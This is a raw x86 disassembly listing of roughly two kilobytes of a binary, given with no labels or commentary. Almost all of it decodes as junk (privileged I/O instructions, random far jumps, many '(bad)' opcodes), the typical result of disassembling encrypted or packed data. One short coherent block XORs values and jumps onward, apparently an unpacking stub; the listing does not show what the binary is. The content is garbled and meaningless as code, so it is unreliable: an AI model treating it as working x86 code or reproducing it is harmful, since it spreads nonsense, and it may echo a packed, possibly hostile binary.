  4096c7:	or     ch,BYTE PTR [edi+0x204af76]
  4096cd:	mov    BYTE PTR [ebx],cl
  4096cf:	and    cl,BYTE PTR [ebx]
  4096d1:	xchg   esp,eax
  4096d2:	loope  0x4096d8
  4096d4:	mov    cl,0x12
  4096d6:	jbe    0x409729
  4096d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096d9:	jbe    0x4096b6
  4096db:	inc    esp
  4096dc:	mov    ch,0x23
  4096de:	loop   0x4096be
  4096e0:	mov    esi,0x29115ac
  4096e5:	imul   eax,DWORD PTR [ebx-0x6c],0x7a
  4096e9:	pop    ecx
  4096ea:	int3   
  4096eb:	adc    al,0x8a
  4096ed:	pop    esi
  4096ee:	sahf   
  4096ef:	hlt    
  4096f0:	enter  0x5354,0x88
  4096f4:	mov    al,0x8d
  4096f6:	push   esp
  4096f7:	xchg   esi,eax
  4096f8:	push   es
  4096f9:	(bad)  
  4096fa:	xchg   ecx,eax
  4096fb:	mov    BYTE PTR ds:0xe3550cde,ch
  409701:	js     0x40977a
  409703:	aam    0x60
  409705:	rcl    BYTE PTR ss:[esi-0x54],1
  409709:	jmp    0xe718:0x59f4445
  409710:	push   esi
  409711:	je     0x4096ad
  409713:	iret   
  409714:	jp     0x4096ed
  409716:	dec    ebp
  409717:	pusha  
  409718:	or     eax,0xe3da9325
  40971d:	in     al,0xb6
  40971f:	jno    0x40975b
  409721:	retf   
  409722:	test   eax,0x21c259c5
  409727:	popa   
  409728:	cwde   
  409729:	icebp  
  40972a:	pop    ds
  40972b:	jge    0x4096c0
  40972d:	and    eax,0x66e72bc6
  409732:	ins    DWORD PTR es:[edi],dx
  409733:	and    eax,0xf5e0f583
  409738:	rcr    DWORD PTR [eax-0x64d0878c],cl
  40973e:	fisubr DWORD PTR [edi]
  409740:	jmp    0x4097a2
  409742:	ja     0x409750
  409744:	fldcw  WORD PTR [edi]
  409746:	mov    edx,0x56160b34
  40974b:	cmp    al,0x1a
  40974d:	and    edx,ebx
  40974f:	push   0xffffffe7
  409751:	pusha  
  409752:	dec    esi
  409753:	jnp    0x4097a1
  409755:	adc    al,0xae
  409757:	cdq    
  409758:	les    ebx,FWORD PTR [ebx-0x2]
  40975b:	mov    dl,0x7d
  40975d:	sahf   
  40975e:	xchg   DWORD PTR ss:[ebp-0x73],edx
  409762:	sbb    ch,BYTE PTR [eax]
  409764:	dec    esi
  409765:	(bad)  [ecx+0x65]
  409768:	xlat   BYTE PTR ds:[ebx]
  409769:	std    
  40976a:	sti    
  40976b:	dec    edi
  40976c:	mov    WORD PTR ds:0x2c0775b6,es
  409772:	jp     0x40975e
  409774:	iret   
  409775:	mov    eax,0x35a509f3
  40977a:	dec    ebx
  40977b:	cmp    ebp,DWORD PTR [ebx+0x5b]
  40977e:	fs (bad) 
  409780:	in     eax,0x5d
  409782:	push   ebp
  409783:	es sbb al,0x69
  409786:	(bad)  
  409787:	and    BYTE PTR [edx],bl
  409789:	adc    BYTE PTR [ecx+0x3fc0216a],0xbd
  409790:	push   cs
  409791:	adc    edi,ebx
  409793:	or     ebx,DWORD PTR [esi-0x337f5e2b]
  409799:	cdq    
  40979a:	jg     0x4097be
  40979c:	lock repnz loop 0x409765
  4097a0:	fld    DWORD PTR ds:0x5f843383
  4097a6:	mov    gs,WORD PTR [edi]
  4097a8:	add    eax,0x1bf25a0e
  4097ad:	cmp    DWORD PTR [edi],edi
  4097af:	das    
  4097b0:	push   edi
  4097b1:	push   cs
  4097b2:	out    0x68,al
  4097b4:	js     0x4097b1
  4097b6:	scas   al,BYTE PTR es:[edi]
  4097b7:	test   al,0x34
  4097b9:	xchg   BYTE PTR [edx],bl
  4097bb:	iret   
  4097bc:	repz gs fxch st(1)
  4097c0:	sbb    esp,0xffffff92
  4097c3:	jne    0x409840
  4097c5:	outs   dx,BYTE PTR ds:[esi]
  4097c6:	pushf  
  4097c7:	sub    eax,0xc78d3018
  4097cc:	enter  0xdd85,0xa1
  4097d0:	enter  0xe834,0x7c
  4097d4:	(bad)  
  4097d5:	mov    dl,0x19
  4097d7:	hlt    
  4097d8:	pop    esp
  4097d9:	dec    ebx
  4097da:	mov    ebx,0x34c21875
  4097df:	sbb    BYTE PTR [ebx-0x7e],ah
  4097e2:	in     al,dx
  4097e3:	inc    ebx
  4097e4:	adc    al,0x6b
  4097e6:	out    dx,eax
  4097e7:	fldenv [edx+esi*8+0x61d308c1]
  4097ee:	sar    BYTE PTR [ebx],cl
  4097f0:	sbb    DWORD PTR [eax-0x47675743],ebp
  4097f6:	jns    0x4097ba
  4097f8:	lock outs dx,DWORD PTR ds:[esi]
  4097fb:	js     0x40978d
  4097fd:	and    dh,BYTE PTR [edx+0x7a661781]
  409803:	adc    cl,dh
  409805:	push   edi
  409806:	outs   dx,BYTE PTR ds:[esi]
  409807:	jno    0x4097c7
  409809:	xchg   BYTE PTR [ebp+0x30ef201f],cl
  40980f:	push   cs
  409810:	sub    al,0x7
  409812:	inc    ebx
  409813:	fst    DWORD PTR [ebx-0x31511e71]
  409819:	aam    0x6d
  40981b:	cmovbe ebp,DWORD PTR [ebx+0x23]
  40981f:	jbe    0x4097ec
  409821:	sub    edi,DWORD PTR [edi]
  409823:	fbld   TBYTE PTR [esi+0x541c48d6]
  409829:	sub    eax,0x1fb4a2bd
  40982e:	cli    
  40982f:	fcom   DWORD PTR [esi]
  409831:	outs   dx,DWORD PTR ds:[esi]
  409832:	xchg   esp,eax
  409833:	pusha  
  409834:	mov    eax,ds:0xd518473f
  409839:	jmp    0x4098aa
  40983b:	xor    al,0x51
  40983d:	inc    ebx
  40983e:	and    BYTE PTR [esi+0x306ae557],al
  409844:	dec    ebx
  409845:	xchg   ecx,eax
  409846:	cmc    
  409847:	loopne 0x409879
  409849:	cmp    DWORD PTR [ebx-0x2bb4cea2],eax
  40984f:	pop    eax
  409850:	lea    eax,[eax-0x42]
  409853:	test   DWORD PTR [ecx+0x19],eax
  409856:	mov    dh,0x23
  409858:	repnz (bad) 
  40985c:	pop    es
  40985d:	imul   esp,edi,0x5c
  409860:	dec    ebx
  409861:	dec    edi
  409862:	xor    eax,0x1a928ff2
  409867:	mov    dh,0x1e
  409869:	mov    al,ds:0xe8ee0253
  40986e:	jle    0x4097ff
  409870:	in     eax,dx
  409871:	es mov ecx,esp
  409874:	fidiv  WORD PTR [esi-0x3481c484]
  40987a:	int    0x48
  40987c:	mov    ecx,0x55c9d43
  409881:	scas   al,BYTE PTR es:[edi]
  409882:	push   cs
  409883:	cli    
  409884:	pusha  
  409885:	pusha  
  409886:	popf   
  409887:	ret    
  409888:	xlat   BYTE PTR ds:[ebx]
  409889:	xchg   DWORD PTR ds:0x3768db82,ecx
  40988f:	mov    al,0xd1
  409891:	pop    edi
  409892:	add    DWORD PTR [ebp+0x6b],ecx
  409895:	xor    eax,edi
  409897:	(bad)
  40989a:	sbb    ebx,edx
  40989c:	das    
  40989d:	pop    ecx
  40989e:	lahf   
  40989f:	xchg   esi,eax
  4098a0:	xchg   BYTE PTR [edi],dh
  4098a2:	mov    ebx,0xb0ad1316
  4098a7:	popa   
  4098a8:	push   esp
  4098a9:	mov    fs,WORD PTR [eax-0x777cc7e3]
  4098af:	xchg   esp,ecx
  4098b1:	adc    edx,eax
  4098b3:	bt     DWORD PTR [ecx+0x14ca1ed7],ebx
  4098ba:	ins    BYTE PTR es:[edi],dx
  4098bb:	data16 fisubr DWORD PTR [eax+0x49]
  4098bf:	xor    eax,0x6bd629ef
  4098c4:	sub    DWORD PTR [ebp-0x76],edx
  4098c7:	mov    ch,0x1d
  4098c9:	mov    ds:0x2ceafb4d,eax
  4098ce:	add    ecx,ebx
  4098d0:	xchg   edx,eax
  4098d1:	sub    al,0x92
  4098d3:	or     eax,0x66fd53b0
  4098d8:	enter  0xfade,0x9
  4098dc:	push   0x612de8fb
  4098e1:	aaa    
  4098e2:	cmp    ebp,DWORD PTR [ebp-0x44681f8a]
  4098e8:	sub    al,0xd2
  4098ea:	fadd   DWORD PTR [edx-0x54]
  4098ed:	pop    ss
  4098ee:	jmp    0x9a7:0xd80fe345
  4098f5:	jbe    0x4098b7
  4098f7:	out    0xcd,al
  4098f9:	int    0x31
  4098fb:	inc    eax
  4098fc:	add    edi,DWORD PTR [ecx-0x3bec7f45]
  409902:	xor    dl,BYTE PTR [ecx+0x910f664]
  409908:	shl    BYTE PTR [esi],0x26
  40990b:	mov    ah,0x3
  40990d:	in     al,dx
  40990e:	(bad)  
  40990f:	in     eax,0xb3
  409911:	imul   edi
  409913:	mov    ds:0xa16f8b28,eax
  409918:	mov    ecx,0x18395cf7
  40991d:	dec    esi
  40991e:	jp     0x4098bc
  409920:	rcr    DWORD PTR [edi-0x6],1
  409923:	and    dl,0xb0
  409926:	pop    ebp
  409927:	ret    0x9e88
  40992a:	xchg   BYTE PTR [ebp+0x38],dl
  40992d:	test   BYTE PTR [edx],dl
  40992f:	(bad)  
  409930:	mov    ebp,0x726bf350
  409935:	add    BYTE PTR [eax+0x17],bl
  409938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409939:	loop   0x409938
  40993b:	push   0x35
  40993d:	push   ebp
  40993e:	xchg   ebx,eax
  40993f:	cmp    esi,DWORD PTR [ecx]
  409941:	retf   0xf28
  409944:	dec    esi
  409945:	jmp    0x4f94baa1
  40994a:	cdq    
  40994b:	fidiv  WORD PTR [ecx-0x9]
  40994e:	cmc    
  40994f:	xchg   DWORD PTR [ebp+0x37f64d75],ebx
  409955:	nop    DWORD PTR [esi+0x65]
  409959:	or     eax,0x5cf12fe3
  40995e:	stos   BYTE PTR es:[edi],al
  40995f:	mov    edi,0x2b78d981
  409964:	ja     0x40994d
  409966:	push   0xae542c03
  40996b:	jp     0x409964
  40996d:	xchg   ebp,eax
  40996e:	push   eax
  40996f:	fadd   QWORD PTR [ebx+0xee40f5e]
  409975:	test   eax,ebx
  409977:	outs   dx,BYTE PTR ds:[esi]
  409978:	(bad)  
  409979:	xor    DWORD PTR [esi-0x6a570425],ebp
  40997f:	gs xchg ebp,eax
  409981:	cdq    
  409982:	ja     0x40999a
  409984:	cmp    bl,dl
  409986:	xor    edx,ebp
  409988:	and    DWORD PTR [ecx],edx
  40998a:	aaa    
  40998b:	inc    ebx
  40998c:	inc    edx
  40998d:	push   es
  40998e:	leave  
  40998f:	cwde   
  409990:	add    dh,BYTE PTR [ecx+0x2486b154]
  409996:	out    dx,al
  409997:	push   edx
  409999:	dec    edi
  40999a:	aas    
  40999b:	dec    esi
  40999c:	push   cs
  40999d:	call   0xc5231903
  4099a2:	fist   DWORD PTR [ebp+0x64c64919]
  4099a8:	cmp    BYTE PTR [eax],ch
  4099aa:	loope  0x409995
  4099ac:	ds push es
  4099ae:	jecxz  0x409a27
  4099b0:	cmp    al,0xcc
  4099b2:	sub    DWORD PTR [edx],edi
  4099b4:	mov    cl,0xbb
  4099b6:	arpl   WORD PTR [edx+0x16357a5b],bx
  4099bc:	cmp    al,BYTE PTR [eax]
  4099be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099bf:	shr    DWORD PTR [ebp+edi*1+0x14],1
  4099c3:	leave  
  4099c4:	mov    ds:0x16f530d2,al
  4099c9:	call   0x48fce91f
  4099ce:	loop   0x4099fb
  4099d0:	mov    al,ds:0x5540cbff
  4099d5:	les    eax,FWORD PTR [edx*8-0x63c4c7f8]
  4099dc:	xchg   ebx,eax
  4099dd:	dec    edi
  4099de:	cwde   
  4099df:	pop    edx
  4099e0:	push   edx
  4099e1:	push   ds
  4099e2:	mov    eax,ds:0x7f5e4b54
  4099e7:	add    ebp,esp
  4099e9:	xor    al,0x4e
  4099eb:	call   0xd5d4:0x99012cf2
  4099f2:	daa    
  4099f3:	or     DWORD PTR [ebx+0x72c9d8a9],esi
  4099f9:	sti    
  4099fa:	mov    ecx,0x2103b574
  4099ff:	cs pop eax
  409a01:	jecxz  0x409a01
  409a03:	jb     0x409a61
  409a05:	(bad)  
  409a06:	mov    al,0xdf
  409a08:	aad    0xa4
  409a0a:	mov    cl,0x44
  409a0c:	mov    esi,0x346c75ea
  409a11:	(bad)  [bp+di-0x22]
  409a15:	xchg   BYTE PTR [eax+0x3d],bl
  409a18:	jmp    0x409a15
  409a1a:	xor    eax,0x4dc9ecb8
  409a1f:	bnd jb 0x409a50
  409a22:	cmc    
  409a23:	adc    eax,0x2cb09955
  409a28:	xor    ah,al
  409a2a:	jecxz  0x409a61
  409a2c:	not    BYTE PTR [ecx]
  409a2e:	shl    ah,cl
  409a30:	mov    ds:0x5cb2eb18,al
  409a35:	inc    edx
  409a36:	cld    
  409a37:	adc    DWORD PTR [ebp+0x428b752],edx
  409a3d:	xchg   esp,eax
  409a3e:	mov    DWORD PTR [ebp+0x35ee7f7],esp
  409a44:	fucomip st,st(6)
  409a46:	xchg   edi,eax
  409a47:	mov    WORD PTR [ecx],?
  409a49:	and    esi,DWORD PTR [ebp+0x4e]
  409a4c:	(bad)  
  409a4d:	inc    edi
  409a4e:	cmp    edi,eax
  409a50:	popaw  
  409a52:	cmc    
  409a53:	lahf   
  409a54:	mov    edi,0xa15f88ab
  409a59:	test   DWORD PTR [edi+0x62ecf465],0x65015bf8
  409a63:	and    edi,DWORD PTR [esi]
  409a65:	loope  0x4099f8
  409a67:	mov    ebp,DWORD PTR [ebp-0x6d]
  409a6a:	test   DWORD PTR [ebx-0x61a23703],edx
  409a70:	dec    esp
  409a71:	mov    bh,0x34
  409a73:	test   BYTE PTR [edx+edx*1+0x286d81af],bh
  409a7a:	inc    edi
  409a7b:	or     ah,BYTE PTR [eax]
  409a7d:	xor    cl,BYTE PTR [eax+0x74]
  409a80:	out    0x55,eax
  409a82:	mov    eax,0xfeca9534
  409a87:	pushf  
  409a88:	or     al,BYTE PTR [ebp+0x22]
  409a8b:	std    
  409a8c:	xor    BYTE PTR [esi],al
  409a8e:	and    cl,BYTE PTR [ecx+edi*4]
  409a91:	xchg   BYTE PTR [edi-0x10ffaf28],bh
  409a97:	outs   dx,DWORD PTR ds:[esi]
  409a98:	ds cmp eax,0x9ca7d1ef
  409a9e:	push   ebp
  409a9f:	jecxz  0x409aed
  409aa1:	fs dec ebx
  409aa3:	cmp    eax,0xb4e88336
  409aa8:	adc    ebx,edi
  409aaa:	and    eax,0xefae1d89
  409aaf:	and    eax,0xfa134180
  409ab4:	xor    BYTE PTR [eax-0x74a9ea81],bl
  409aba:	or     eax,0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b30
  409b48:	bound  edi,QWORD PTR [ebp+0x32]
  409b4b:	cmp    DWORD PTR [edx+edi*2],eax
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	mov    ds:0xb531cd56,eax
  409b58:	cmp    eax,DWORD PTR [ebp-0x57d72caa]
  409b5e:	add    al,0x79
  409b60:	jbe    0x409ba4
  409b62:	or     al,0xcb
  409b64:	(bad)
  409b69:	cli    
  409b6a:	in     al,0x29
  409b6c:	xchg   DWORD PTR [ebp-0x72016867],esp
  409b72:	les    ecx,FWORD PTR [eax+0x5417c79e]
  409b78:	mov    ah,0xa0
  409b7a:	lock fs adc bh,ah
  409b7e:	btc    DWORD PTR ds:0xae3e66ab,ecx
  409b85:	call   0xbfd0:0x4f9a3543
  409b8c:	iret   
  409b8d:	int    0x31
  409b8f:	loopne 0x409bcc
  409b91:	push   ebx
  409b92:	push   ds
  409b93:	push   eax
  409b94:	mov    eax,DWORD PTR [ebx+0x33]
  409b97:	adc    BYTE PTR ds:0xea2546c,bh
  409b9d:	sub    BYTE PTR [ecx+0x30],cl
  409ba0:	call   0xa7f42108
  409ba5:	sbb    edx,DWORD PTR [eax-0x2e]
  409ba8:	not    BYTE PTR [ecx+0x23]
  409bab:	or     eax,0xf8f00d0
  409bb0:	and    eax,DWORD PTR [eax]
  409bb2:	xchg   ah,ch
  409bb4:	mov    gs,esp
  409bb6:	popf   
  409bb7:	jmp    0x7260:0xcbe9ae2e
  409bbe:	jmp    0x409c2e
  409bc0:	mov    ecx,0xa3ea660e
  409bc5:	sub    BYTE PTR [ebx-0x64ca2f02],al
  409bcb:	dec    edi
  409bcc:	mov    esp,0x2b9ff70
  409bd1:	(bad)  
  409bd2:	mov    ecx,0x5a161d31
  409bd7:	hlt    
  409bd8:	inc    ebp
  409bd9:	imul   esp,DWORD PTR [esi],0x8ea3f980
  409bdf:	mov    ds:0x51b5c3bd,eax
  409be4:	mov    BYTE PTR [edx+0x171839db],cl
  409bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409beb:	sbb    ebp,DWORD PTR [esi+0x7865f2a3]
  409bf1:	call   0x2926462d
  409bf6:	into   
  409bf7:	bound  esi,QWORD PTR [edx-0x6f]
  409bfa:	pop    edx
  409bfb:	out    0x2b,al
  409bfd:	push   esi
  409bfe:	leave  
  409bff:	adc    edx,DWORD PTR [edx]
  409c01:	data16 jno 0x409b91
  409c04:	sbb    ebp,DWORD PTR [eax+0x7b2e585b]
  409c0a:	adc    al,0x2c
  409c0c:	jbe    0x409c52
  409c0e:	and    DWORD PTR [ebp-0x4a],esp
  409c11:	les    eax,FWORD PTR [edx+0x5d]
  409c14:	jae    0x409c8c
  409c16:	dec    edx
  409c17:	sub    BYTE PTR [eax+0x2196ae19],bh
  409c1d:	sub    BYTE PTR [esi-0x13],al
  409c20:	cmp    al,0x75
  409c22:	dec    ebx
  409c23:	mov    BYTE PTR [esi+0x4],al
  409c26:	adc    edi,DWORD PTR [ebx+0x60432bf6]
  409c2c:	sub    bl,BYTE PTR [edx]
  409c2e:	add    BYTE PTR [edx+0x6cf18c5c],al
  409c34:	dec    esp
  409c35:	and    eax,0x7262704b
  409c3a:	cmp    dl,BYTE PTR [esi+edx*1]
  409c3d:	aas    
  409c3e:	xchg   edi,eax
  409c3f:	adc    ebp,edi
  409c41:	xchg   esi,eax
  409c42:	sbb    al,0x71
  409c44:	test   DWORD PTR [eax+0x40],0xcb9c44f2
  409c4b:	pusha  
  409c4c:	idiv   BYTE PTR [edx+eax*1-0x3e]
  409c50:	jae    0x409c1e
  409c52:	inc    ebx
  409c53:	mov    ah,0xa
  409c55:	out    dx,al
  409c56:	push   esp
  409c57:	adc    BYTE PTR [ecx],0xf6
  409c5a:	int3   
  409c5b:	or     ch,BYTE PTR [edi+0x4abf5861]
  409c61:	mov    ebx,0xb20ff374
  409c66:	leave  
  409c67:	dec    edi
  409c68:	clc    
  409c69:	jl     0x409cc3
  409c6b:	(bad)  
  409c6c:	gs ds cmc 
  409c6f:	xchg   ecx,eax
  409c70:	push   esp
  409c71:	sqrtps xmm4,xmm1
  409c74:	inc    esi
  409c75:	sub    eax,edx
  409c77:	add    DWORD PTR [ecx+0x5b],edi
  409c7a:	repnz shl BYTE PTR ds:0x299de6f2,cl
  409c81:	jo     0x409ccc
  409c83:	push   esp
  409c84:	dec    ebp
  409c85:	fwait
  409c86:	pop    ebp
  409c87:	pushf  
  409c88:	fdiv   st(0),st
  409c8a:	sub    bl,cl
  409c8c:	popf   
  409c8d:	loope  0x409c73
  409c8f:	shl    BYTE PTR [esi+0x32],0xd
  409c93:	mov    eax,ds:0x832d4197
  409c98:	xchg   ebp,eax
  409c99:	jmp    0x3ec6ce23
  409c9e:	(bad)  
  409c9f:	add    al,0xb8
  409ca1:	pop    es
  409ca2:	inc    edi
  409ca3:	pop    esi
  409ca4:	dec    ebp
  409ca5:	sub    al,0x96
  409ca7:	push   edi
  409ca8:	rcr    BYTE PTR [ebx],0xbe
  409cab:	push   es
  409cac:	jle    0x409cb7
  409cae:	data16 hlt 
  409cb0:	out    dx,eax
  409cb1:	int    0xc9
  409cb3:	pfrsqit1 mm3,QWORD PTR [ecx+0x4c]
  409cb8:	mul    DWORD PTR [ebx+0x705cfd9f]
  409cbe:	and    dl,dh
  409cc0:	sub    eax,DWORD PTR [ecx]
  409cc2:	xor    dh,cl
  409cc4:	gs ins DWORD PTR es:[edi],dx
  409cc6:	in     al,dx
  409cc7:	push   ecx
  409cc8:	or     BYTE PTR [ecx+eax*1+0x6a5df1e4],bh
  409ccf:	test   DWORD PTR [esi+0x1],ebx
  409cd2:	jge    0x409d34
  409cd4:	leave  
  409cd5:	iret   
  409cd6:	aaa    
  409cd7:	or     al,0xdd
  409cd9:	sldt   WORD PTR [ebx+0x3a]
  409cdd:	hlt    
  409cde:	mov    BYTE PTR [ecx-0x36891f89],ch
  409ce4:	outs   dx,BYTE PTR ds:[esi]
  409ce5:	fcmovb st,st(0)
  409ce7:	or     BYTE PTR [eax+0x32e0c63f],0xc0
  409cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cef:	jo     0x409c9f
  409cf1:	lock (bad) 
  409cf3:	cmp    bh,BYTE PTR [ebp+0x7b2e0c16]
  409cf9:	ins    DWORD PTR es:[edi],dx
  409cfa:	hlt    
  409cfb:	bound  ebx,QWORD PTR [eax-0x3e9c8daa]
  409d01:	add    bl,BYTE PTR [ebx]
  409d03:	in     al,dx
  409d04:	jo     0x409ca2
  409d06:	or     esi,DWORD PTR [eax+0x7c83ffbf]
  409d0c:	jle    0x409cd3
  409d0e:	sub    BYTE PTR [ebx-0x18],ah
  409d11:	int    0x14
  409d13:	or     DWORD PTR [ebx+0x26],edx
  409d16:	xchg   ebp,eax
  409d17:	add    bh,cl
  409d19:	jecxz  0x409d21
  409d1b:	ins    BYTE PTR es:[edi],dx
  409d1c:	dec    ebp
  409d1d:	div    edx
  409d1f:	adc    BYTE PTR [edx-0xf],dl
  409d22:	inc    eax
  409d23:	lock cmp al,BYTE PTR [edi-0x39]
  409d27:	(bad)  
  409d28:	clc    
  409d29:	push   esi
  409d2a:	je     0x409cb2
  409d2c:	push   edx
  409d2d:	push   es
  409d2e:	bound  edi,QWORD PTR ss:[edi+ecx*2+0x6]
  409d33:	xor    DWORD PTR [esi],ecx
  409d35:	gs daa 
  409d37:	rcr    BYTE PTR [edx-0x18349eb1],cl
  409d3d:	aam    0xde
  409d3f:	inc    esi
  409d40:	test   DWORD PTR [ebp-0x7e],eax
  409d43:	mov    ecx,0xeb8a6858
  409d48:	mov    esp,0x5323886
  409d4d:	xchg   edi,eax
  409d4e:	jae    0x409daa
  409d50:	loope  0x409d1b
  409d52:	push   esi
  409d53:	fistp  QWORD PTR [edx]
  409d55:	or     eax,DWORD PTR [esp+eiz*4+0x29]
  409d59:	call   0x1ab9:0x721209cf
  409d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d61:	push   0xfffffff2
  409d63:	xchg   ebx,eax
  409d64:	arpl   WORD PTR ds:0x34e0483f,ax
  409d6a:	pushf  
  409d6b:	xor    al,0xce
  409d6d:	ficom  DWORD PTR [esi]
  409d6f:	in     eax,0xab
  409d71:	sub    DWORD PTR [esi+eiz*4],ebp
  409d74:	push   0xcc4d9844
  409d79:	or     al,0x4f
  409d7b:	(bad)  
  409d7c:	in     al,0x2f
  409d7e:	mov    dh,0x94
  409d80:	mov    al,ds:0x4285c639
  409d85:	mov    eax,ds:0x432b17da
  409d8a:	pop    ebp
  409d8b:	jae    0x409d5f
  409d8d:	cli    
  409d8e:	mov    eax,0x88f68853
  409d93:	loopne 0x409d4d
  409d95:	cdq    
  409d96:	and    BYTE PTR [esi+0x878bfdf],bl
  409d9c:	mov    WORD PTR ds:[esi],ss
  409d9f:	inc    esi
  409da0:	ins    DWORD PTR es:[edi],dx
  409da1:	imul   esp,DWORD PTR es:[ebx],0x5f0b9f94
  409da8:	and    bl,BYTE PTR ds:0xdea68c9c
  409dae:	mov    bh,0xe9
  409db0:	retf   0x109f
  409db3:	fwait
  409db4:	(bad)  
  409db5:	fld    QWORD PTR [ecx]
  409db7:	adc    eax,0x44e33acb
  409dbc:	mov    bl,0x8
  409dbe:	xchg   ecx,eax
  409dbf:	push   edi
  409dc0:	in     al,0x99
  409dc2:	mov    eax,ds:0xeb871d71
  409dc7:	pop    edx
  409dc8:	and    cl,BYTE PTR [eax+0x79]
  409dcb:	adc    al,BYTE PTR [eax-0x747a984c]
  409dd1:	sar    DWORD PTR [edx+ebp*8],0x6b
  409dd5:	int3   
  409dd6:	mov    edi,0x1c399204
  409ddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ddc:	xchg   esp,eax
  409ddd:	mov    DWORD PTR [ebx+0x101ec679],0xfdbc4e20
  409de7:	cmp    al,0xd
  409de9:	jmp    0x7349:0xad02cc1a
  409df0:	push   edi
  409df1:	(bad)  
  409df2:	sti    
  409df3:	inc    esp
  409df4:	aaa    
  409df5:	xchg   cl,ch
  409df7:	cmp    edx,ebp
  409df9:	adc    ebp,esi
  409dfb:	sbb    DWORD PTR [ecx],edx
  409dfd:	xchg   edi,eax
  409dfe:	lds    edi,FWORD PTR [esp+eax*1+0x1cbb453c]
  409e05:	mov    edx,ecx
  409e07:	xchg   ebx,eax
  409e08:	(bad)  
  409e09:	(bad)  
  409e0a:	das    
  409e0b:	hlt    
  409e0c:	sub    DWORD PTR [ecx+0x1a],esp
  409e0f:	sub    esp,DWORD PTR [edi-0x6736d443]
  409e15:	sti    
  409e16:	data16 faddp st(7),st
  409e19:	inc    ebp
  409e1a:	push   es
  409e1b:	loope  0x409e57
  409e1d:	cld    
  409e1e:	fcomip st,st(1)
  409e20:	mov    dl,0x8a
  409e22:	sub    al,0xca
  409e24:	mov    ?,WORD PTR [eax+0x6]
  409e27:	(bad)  
  409e29:	lods   eax,DWORD PTR ds:[esi]
  409e2a:	add    bh,BYTE PTR [ebp+0x1cb7230b]
  409e30:	in     eax,0x7a
  409e32:	pushf  
  409e33:	cli    
  409e34:	nop
  409e35:	cwde   
  409e36:	adc    al,0xc3
  409e38:	and    al,0x14
  409e3a:	pcmpgtd mm3,QWORD PTR [si]
  409e3e:	pop    cx
  409e40:	repz xor BYTE PTR ds:0x2e22f9fc,bh
  409e47:	sbb    bl,0xd3
  409e4a:	add    dl,dh
  409e4c:	xor    BYTE PTR [ebp-0x65908b57],ch
  409e52:	dec    esi
  409e53:	adc    eax,0xd5b9707b
  409e58:	out    dx,al
  409e59:	or     BYTE PTR [ebx+0x23242caa],dl
  409e5f:	push   edx
  409e60:	nop
  409e61:	(bad)  
  409e62:	pushf  
  409e63:	leave  
  409e64:	add    cl,cl
  409e66:	scas   al,BYTE PTR es:[edi]
  409e67:	adc    al,0x3a
  409e69:	mov    eax,ds:0x808bf10f
  409e6e:	push   es
  409e6f:	loop   0x409e1c
  409e71:	inc    ecx
  409e72:	shl    BYTE PTR [esi-0x2d],0xad
  409e76:	jge    0x409e22
  409e78:	mov    al,0xb7
  409e7a:	inc    DWORD PTR [ebp-0x49]
  409e7d:	(bad)  
  409e7e:	out    0x97,eax
  409e80:	push   es
  409e81:	dec    ebx
  409e82:	shl    DWORD PTR [ebx],1
  409e84:	cmp    eax,0xccc0048b
  409e89:	(bad)  
  409e8a:	fisubr DWORD PTR [edi-0x4982fda8]
  409e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e91:	and    eax,0xee1e04f0
  409e96:	push   edx
  409e97:	inc    edx
  409e98:	rep stos BYTE PTR es:[edi],al
  409e9a:	arpl   WORD PTR ds:0x37dc784,bx
  409ea0:	inc    ecx
  409ea1:	retf   0xf47b
  409ea4:	adc    DWORD PTR ds:[ebx+0x59ccb571],esp
  409eab:	jle    0x409e7d
  409ead:	add    eax,0xd3fb6ca9
  409eb2:	sbb    eax,0x5e9dcbd8
  409eb7:	je     0x409efb
  409eb9:	int    0x6d
  409ebb:	mov    ch,0xd1
  409ebd:	outs   dx,BYTE PTR ds:[esi]
  409ebe:	sbb    al,ah
  409ec0:	ror    BYTE PTR [esi],0xed
  409ec3:	ins    BYTE PTR es:[edi],dx
  409ec4:	xchg   ecx,eax
  409ec5:	stos   DWORD PTR es:[edi],eax
  409ec6:	outs   dx,BYTE PTR ds:[esi]
  409ec7:	pop    esi
  409ec8:	sbb    DWORD PTR [eax-0x33816aed],0xfffffffb
  409ecf:	in     eax,dx
  409ed0:	rcr    DWORD PTR [ebp-0x47ec4033],1
  409ed6:	fild   WORD PTR [ebx+0x66]
  409ed9:	pop    ebp
